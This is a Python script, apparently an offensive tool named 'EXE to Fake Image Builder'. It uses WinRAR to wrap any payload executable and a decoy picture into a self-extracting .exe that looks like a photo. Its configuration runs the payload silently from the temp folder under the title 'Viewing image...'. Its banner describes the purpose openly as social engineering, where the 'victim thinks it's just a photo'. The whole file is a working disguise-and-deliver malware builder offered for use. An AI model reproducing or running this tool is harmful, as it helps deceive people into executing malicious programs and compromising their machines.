import os
import sys
import subprocess
import shutil
import random
from colorama import init, Fore
init(autoreset=True)
LIGHTCYAN = Fore.LIGHTCYAN_EX
class EXEtoImageBuilder:
    def __init__(self):
        self.output_folder = os.path.join(os.getcwd(), 'output')
        self.winrar_path = self.find_winrar()
    def find_winrar(self):
        possible_paths = ['C:\\Program Files\\WinRAR\\WinRAR.exe', 'C:\\Program Files (x86)\\WinRAR\\WinRAR.exe', 'C:\\WinRAR\\WinRAR.exe']
        for path in possible_paths:
            if os.path.exists(path):
                return path
        return None
    def print_banner(self):
        banner = '\n ________  __    __  ________    ________   ______         ______  __       __   ______  \n|        \\|  \\  |  \\|        \\  |        \\ /      \\       |      \\|  \\     /  \\ /      \\ \n| $$$$$$$$| $$  | $$| $$$$$$$$   \\$$$$$$$$|  $$$$$$\\       \\$$$$$$| $$\\   /  $$|  $$$$$$\\\n| $$__     \\$$\\/  $$| $$__  ______ | $$   | $$  | $$ ______ | $$  | $$$\\ /  $$$| $$ __\\$$\n| $$  \\     >$$  $$ | $$  \\|      \\| $$   | $$  | $$|      \\| $$  | $$$$\\  $$$$| $$|    \\\n| $$$$$    /  $$$$\\ | $$$$$ \\$$$$$$| $$   | $$  | $$ \\$$$$$$| $$  | $$\\$$ $$ $$| $$ \\$$$$\n| $$_____ |  $$ \\$$\\| $$_____      | $$   | $$__/ $$       _| $$_ | $$ \\$$$| $$| $$__| $$\n| $$     \\| $$  | $$| $$     \\     | $$    \\$$    $$      |   $$ \\| $$  \\$ | $$ \\$$    $$\n \\$$$$$$$$ \\$$   \\$$ \\$$$$$$$$      \\$$     \\$$$$$$        \\$$$$$$ \\$$      \\$$  \\$$$$$$ \n                                                                                         \n                                                                                         \n                                                                                                                                                                     \n        '
        print(LIGHTCYAN + banner)
        print(LIGHTCYAN + '[+] ============================= EXE to Fake Image Builder ==============================')
        print(LIGHTCYAN + '[+] Creates a self-extracting .exe that looks like an image')
        print(LIGHTCYAN + '[+] Uses your custom icon + background image')
        print(LIGHTCYAN + '[+] Silently executes your payload.exe in background')
        print(LIGHTCYAN + '[+] Perfect for social engineering – victim thinks it\'s just a photo')
        print(LIGHTCYAN + '[+] Output in \'output\' folder')
        print(LIGHTCYAN + '[+] =====================================================================================\n')
    def get_user_input(self):
        os.makedirs(self.output_folder, exist_ok=True)
        print(LIGHTCYAN + '[*] Enter the full paths to your files:\n')
        use_icon = input(LIGHTCYAN + 'Do you want a custom icon? (y/n, default n): ').strip().lower()
        if use_icon == 'y':
            icon_path = input(LIGHTCYAN + 'Enter full path to .ico file: ').strip()
            if not os.path.exists(icon_path) or not icon_path.lower().endswith('.ico'):
                print(LIGHTCYAN + '[-] Invalid or non-existent icon – compiling without custom icon')
                self.icon_path = None
            else:
                self.icon_path = icon_path
                print(LIGHTCYAN + f'[+] Icon selected: {self.icon_path}')
        else:
            self.icon_path = None
        image_path = input(LIGHTCYAN + 'Enter full path to image (jpg/png): ').strip()
        if not os.path.exists(image_path) or not image_path.lower().endswith(('.jpg', '.jpeg', '.png')):
            print(LIGHTCYAN + '[-] ERROR: Invalid image path or format!')
            sys.exit(1)
        self.image_path = image_path
        print(LIGHTCYAN + f'[+] Image selected: {self.image_path}')
        payload_path = input(LIGHTCYAN + 'Enter full path to payload.exe: ').strip()
        if not os.path.exists(payload_path) or not payload_path.lower().endswith('.exe'):
            print(LIGHTCYAN + '[-] ERROR: Invalid payload path!')
            sys.exit(1)
        self.payload_path = payload_path
        print(LIGHTCYAN + f'[+] Payload selected: {self.payload_path}')
        output_name = input(LIGHTCYAN + 'Enter output filename (default: picture.exe): ').strip() or 'picture.exe'
        if not output_name.lower().endswith('.exe'):
            output_name += '.exe'
        self.output_exe = os.path.join(self.output_folder, output_name)
    def create_sfx_config(self, temp_dir):
        config_content = 'Path=%TEMP%\nSilent=1\nOverwrite=1\nSetup={payload}\nTempMode\nTitle=Viewing image...\n'
        config_path = os.path.join(temp_dir, 'sfx_config.txt')
        with open(config_path, 'w') as f:
            f.write(config_content.format(payload=os.path.basename(self.payload_path)))
        return config_path
    def build(self):
        if not self.winrar_path:
            print(LIGHTCYAN + '[-] ERROR: WinRAR not found! Install WinRAR.')
            sys.exit(1)
        print(LIGHTCYAN + '[+] WinRAR found – building fake image...')
        temp_dir = os.path.join(self.output_folder, f'temp_{random.randint(10000, 99999)}')
        os.makedirs(temp_dir, exist_ok=True)
        shutil.copy(self.payload_path, temp_dir)
        shutil.copy(self.image_path, temp_dir)
        new_image_path = os.path.join(temp_dir, 'photo.jpg')
        os.rename(os.path.join(temp_dir, os.path.basename(self.image_path)), new_image_path)
        config_path = self.create_sfx_config(temp_dir)
        sfx_module = os.path.join(os.path.dirname(self.winrar_path), 'Default.SFX')
        if not os.path.exists(sfx_module):
            print(LIGHTCYAN + '[-] Default.SFX not found – trying without specific module')
            sfx_option = ['-sfx']
        else:
            sfx_option = [f'-sfx{sfx_module}']
        icon_option = ['-iicon' + self.icon_path] if self.icon_path else []
        command = [self.winrar_path, 'a', '-ep1', '-inul', *sfx_option, '-z' + config_path, *icon_option, self.output_exe, os.path.join(temp_dir, '*')]
        print(LIGHTCYAN + '[*] Creating SFX executable...')
        result = subprocess.run(command, capture_output=True, text=True)
        if result.returncode == 0 and os.path.exists(self.output_exe):
            print(LIGHTCYAN + f'[+] SUCCESS! Fake image created: {self.output_exe}')
            print(LIGHTCYAN + '[+] Double-click → opens as image + runs payload silently')
        else:
            print(LIGHTCYAN + '[-] ERROR:')
            print(LIGHTCYAN + result.stderr or result.stdout)
        shutil.rmtree(temp_dir, ignore_errors=True)
        print(LIGHTCYAN + '[+] Cleanup done')
        print(LIGHTCYAN + '[+] Press Enter to exit...')
        input()
if __name__ == '__main__':
    os.system('cls' if os.name == 'nt' else 'clear')
    builder = EXEtoImageBuilder()
    builder.print_banner()
    builder.get_user_input()
    builder.build()